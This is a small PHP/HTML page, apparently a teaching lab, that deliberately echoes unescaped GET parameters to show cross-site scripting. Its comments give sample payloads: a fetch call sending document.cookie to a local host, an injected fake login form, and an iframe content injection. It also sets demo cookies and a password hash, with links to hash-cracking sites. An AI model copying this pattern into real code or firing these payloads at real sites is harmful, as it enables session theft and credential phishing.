<?php
// vul: query=<script>alert("hello")</script>
$query = $_GET['query'];

// vul: reflected=<script>fetch(`http://localhost:8000/data=${document.cookie}`)</script>
setcookie("secret", "secretsrevealed");
setcookie("login_session", "secret_login_session");
// password : secret_password
setcookie("password_encoded", "8e67dd1355714239acde098b6f1cf906bde45be6db826dc2caca7536e07ae844");
// decrypt online > https://www.dcode.fr/cipher-identifier
// decript sha256 > https://md5hashing.net/hash/sha256
$reflected = $_GET['reflected'];

// vul : dom=<script>const dom=document.querySelector("body");const userlabel=document.createElement("label");userlabel.innerText="User";const user=document.createElement("input");const passlabel=document.createElement("label");const pass=document.createElement("input");passlabel.innerText="Password";const btn=document.createElement("button");btn.innerText="Send";dom.appendChild(userlabel);dom.appendChild(user);dom.appendChild(passlabel);dom.appendChild(pass);dom.appendChild(btn)</script>
$dom = $_GET['dom'];

// vul : Content injection
// query=%3Ciframe%20src=http://127.0.0.1:8000/Pictures/frenchie-geometrical.jpg%20height=%22250rem%22%20width=%22250rem%22%3E%3C/iframe%3E

?>
<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Basic Template</title>

</head>

<body>
  <h1>Vulnerable Website Title</h1>
  <?php 
    // $query = htmlspecialchars($query, ENT_QUOTES);
    if ($query) { 
  ?>
    <div><?php echo $query ?></div>
  <?php } ?>
  <?php
    // reflected
    if ($reflected) echo $reflected;
    // DOM based
    if ($dom) echo $dom;
  ?>
  <script>
    // input sanitization and encoding validation
    // exposed endpoints
    // headers and cross-site scripting
    // algorithms and hashing 
    
    // zero trust (adding layers of defenses anywhere possible or If It is only applied in one place, it should be applied consistently)
    // . The potential impact of XSS is not limited to stealing cookies. Other examples of XSS payloads include keystroke loggers, phishing attacks, port scanning, and content scrapers/skimmers.
    
    // insecure patterns
    // https://owasp.org/www-community/How_to_write_insecure_code
    // defensive coding
  </script>
</body>
</html>
